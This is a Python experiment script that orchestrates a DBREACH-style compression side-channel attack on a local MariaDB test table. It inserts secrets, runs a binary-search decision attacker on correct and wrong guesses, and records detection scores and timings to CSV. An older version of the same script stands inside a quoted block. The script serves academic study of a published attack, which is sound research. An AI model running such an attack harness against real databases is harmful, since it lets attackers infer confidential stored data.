import utils.mariadb_utils as utils
import dbreacher
import dbreacher_impl_binary_search
import decision_attacker_binary
import random
import string
import time
import sys
import argparse

from pathlib import Path

'''
control = utils.MariaDBController(
    db_name,
    host="mariadb_container",
    port=3306,
    datadir="/var/lib/mysql",
    container_name="mariadb_container",
    container_datadir="/var/lib/mysql",
)


parser = argparse.ArgumentParser(description="GDBREACH attack")
parser.add_argument('--dataset', choices=['random', 'english', 'emails'])
parser.add_argument('--Compressible_bytes', type=int)
parser.add_argument('--Random_bytes', type=int)
args = parser.parse_args()


len_of_Compressible_bytes = args.Compressible_bytes
len_of_Random_bytes = args.Random_bytes
maxRowSize = len_of_Compressible_bytes + len_of_Random_bytes

control = utils.MariaDBController("testdb")

table = "victimtable"
control.drop_table(table)
control.create_basic_table(table,
            varchar_len=maxRowSize,
        compressed=True,
        encrypted=False)

possibilities = []

if args.dataset == "random":
    with open("/home/scy/Desktop/gdbreach-attacks-master1/gdbreach-attacks-master/resources/10000-english-long.txt") as f:
        for line in f:
            word = line.strip().lower()
            possibilities.append(word)
if args.dataset == "english":
    with open("/home/britney/dbreach-britney/resources/english-dataset.txt") as f:
        for line in f:
            word = line.strip().lower()
            possibilities.append(word)
if args.dataset == "emails":
    with open("/home/britney/dbreach-britney/resources/emails-dataset.txt") as f:
        for line in f:
            email = line.strip().lower()
            possibilities.append(email)

print("true_label,num_secrets,b_no,b_guess,b_yes,setup_time,per_guess_time")

secrets_to_try = [100]
secrets_to_try.reverse()
startAttack = time.time()
for num_secrets in secrets_to_try:
    # random.shuffle(possibilities)
    for trial in range(0, 10):
        trial_possibilities = possibilities[0:200]
        success = False
        control.drop_table(table)
        control.create_basic_table(table,
            varchar_len=maxRowSize,
            compressed=True, 
            encrypted=False)
        guesses = []
        correct_guesses = set()
        for secret_idx in range(num_secrets):
            secret = trial_possibilities[(trial + secret_idx) % len(trial_possibilities)]
            control.insert_row(table, secret_idx, secret)
            
            guesses.append(secret)
            
            correct_guesses.add(secret)        
        print(f"correct_guesses : {correct_guesses}")

        print('wrong guesses : ')
        for secret_idx in range(num_secrets, num_secrets*2):
            wrong_guess = trial_possibilities[(trial + secret_idx) % len(trial_possibilities)]
            guesses.append(wrong_guess)

            print(f'{wrong_guess}, ')
        
        
        guess_len = [len(g) for g in guesses]  
        min_len = min(guess_len)
        max_len = max(guess_len)
        
        # random_guess_len = random.randint(min_len, max_len)
        random_guess_len = max_len
        print("random_guess_len : ", random_guess_len)
        
        fillerCharSet = string.printable.replace(string.ascii_lowercase, '').replace('*', '')
        if sys.argv[1] == "--emails":
            fillerCharSet = fillerCharSet.replace('_', '').replace('.', '').replace('@', '')
        dbreacher = dbreacher_impl_binary_search.DBREACHerImpl(control, table, num_secrets, maxRowSize, fillerCharSet, ord('*'),len_of_Compressible_bytes, len_of_Random_bytes, guesses, random_guess_len)

        startRound = time.time()

        attacker = decision_attacker_binary.decisionAttacker(dbreacher, guesses, random_guess_len)
        while not success:
            setupStart = time.time()
            # print("Start : " , setupStart)
            success = attacker.setUp()
            setupEnd = time.time()
            # print("End : " , setupEnd)
            if success:
                success = attacker.tryAllGuesses()
            end = time.time()
        refScores = attacker.getGuessAndReferenceScores()
        print("refScores : " , refScores)
        endRound = time.time ()
        for guess, score_tuple in refScores:
            print("score_tuple : ", score_tuple)
            label = 1 if guess in correct_guesses else 0
            
            print(str(label)+","+str(num_secrets)+","+str(score_tuple[0])+","+str(score_tuple[1])+","+str(score_tuple[2]) +","+str(setupEnd - setupStart)+","+str((end-setupEnd)/num_secrets) + "," + str((end-setupEnd)/len(guesses)))
            
        # print("End : " , endRound)
        print("Total DB Queries This Round: " + str(dbreacher.db_count))
        print("Total time spent this round in seconds: " + str(endRound-startRound))
        
        

        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        

'''
table = "victimtable"
db_name = "flask_db"

control = utils.MariaDBController(
    db_name,
    host="mariadb_container",
    port=3306,
    datadir="/var/lib/mysql",
##    container_name="mariadb_container",
##    container_datadir="/var/lib/mysql",
)



parser = argparse.ArgumentParser(description="GDBREACH attack")
parser.add_argument('--dataset', choices=['random', 'english', 'emails'])
parser.add_argument('--Compressible_bytes', type=int)
parser.add_argument('--Random_bytes', type=int)
args = parser.parse_args()


len_of_Compressible_bytes = args.Compressible_bytes
len_of_Random_bytes = args.Random_bytes
maxRowSize = len_of_Compressible_bytes + len_of_Random_bytes

###
OUT_DIR = Path("01010") / f"{args.dataset}_{len_of_Compressible_bytes}_{len_of_Random_bytes}" 
OUT_DIR.mkdir(parents=True, exist_ok=True) 
###

#control = utils.MariaDBController("testdb")

table = "victimtable"
control.drop_table(table)
control.create_basic_table(
    table,
    varchar_len=maxRowSize,
    compressed=True,
    encrypted=True,   # ★ 논문 전제
)

possibilities = []

if args.dataset == "random":
    with open("./resources/10000-english-long.txt") as f:
        for line in f:
            word = line.strip().lower()
            possibilities.append(word)
if args.dataset == "english":
    with open("./resources/english-dataset.txt") as f:
        for line in f:
            word = line.strip().lower()
            possibilities.append(word)
if args.dataset == "emails":
    with open("./resources/emails-dataset.txt") as f:
        for line in f:
            email = line.strip().lower()
            possibilities.append(email)

print("true_label,num_secrets,b_no,b_guess,b_yes,setup_time,per_guess_time")

secrets_to_try = [100]
secrets_to_try.reverse()
startAttack = time.time()
for num_secrets in secrets_to_try:
    # print("num : ", num_secrets)
    # random.shuffle(possibilities)
    for trial in range(0,10):   #여기서는 한번 실행
        trial_possibilities = possibilities[0:200]
        success = False
        control.drop_table(table)
        control.create_basic_table(table,
            varchar_len=maxRowSize,
            compressed=True, 
            encrypted=True)
        
        ###
        trial_csv = OUT_DIR / f"trial_{trial}.csv"
        with open(trial_csv, "w", encoding="utf-8") as csvf:
            csvf.write("true_label,num_secrets,b_no,b_guess,b_yes,setup_time,per_guess_time\n")
        
        ###
        
            guesses = []
            correct_guesses = set()
            for secret_idx in range(num_secrets):
                secret = trial_possibilities[(trial + secret_idx) % len(trial_possibilities)]
                control.insert_row(table, secret_idx, secret)
                
                guesses.append(secret)
                
                correct_guesses.add(secret)

            for secret_idx in range(num_secrets, num_secrets*2):
                wrong_guess = trial_possibilities[(trial + secret_idx) % len(trial_possibilities)]
                guesses.append(wrong_guess)

            
            guess_len = [len(g) for g in guesses]  
            min_len = min(guess_len)
            max_len = max(guess_len)
            
            # random_guess_len = random.randint(min_len, max_len)
            random_guess_len = max_len
            
            fillerCharSet = string.printable.replace(string.ascii_lowercase, '').replace('*', '')
            if sys.argv[1] == "--emails":
                fillerCharSet = fillerCharSet.replace('_', '').replace('.', '').replace('@', '')
            dbreacher = dbreacher_impl_binary_search.DBREACHerImpl(control, table, num_secrets, maxRowSize, fillerCharSet, ord('*'),len_of_Compressible_bytes, len_of_Random_bytes, guesses, random_guess_len)

            startRound = time.time()

            attacker = decision_attacker_binary.decisionAttacker(dbreacher, guesses, random_guess_len)
            while not success:
                setupStart = time.time()
                # print("Start : " , setupStart)
                success = attacker.setUp()
                setupEnd = time.time()
                # print("End : " , setupEnd)
                if success:
                    success = attacker.tryAllGuesses()
                end = time.time()
            refScores = attacker.getGuessAndReferenceScores()
            endRound = time.time ()
            for guess, score_tuple in refScores:
                label = 1 if guess in correct_guesses else 0
                
                # print(str(label)+","+str(num_secrets)+","+str(score_tuple[0])+","+str(score_tuple[1])+","+str(score_tuple[2]) +","+str(setupEnd - setupStart)+","+str((end-setupEnd)/num_secrets))
                csvf.write(str(label)+","+str(num_secrets)+","+str(score_tuple[0])+","+str(score_tuple[1])+","+str(score_tuple[2]) +","+str(setupEnd - setupStart)+","+str((end-setupEnd)/num_secrets) + "\n") ###
            # print("End : " , endRound)
            # print("Total DB Queries This Round: " + str(dbreacher.db_count))
            # print("Total time spent this round in seconds: " + str(endRound-startRound))
            # csvf.write("Total DB Queries This Round: " + str(dbreacher.db_count))
            csvf.write("Total time spent this round in seconds: " + str(endRound-startRound))
            
            # '''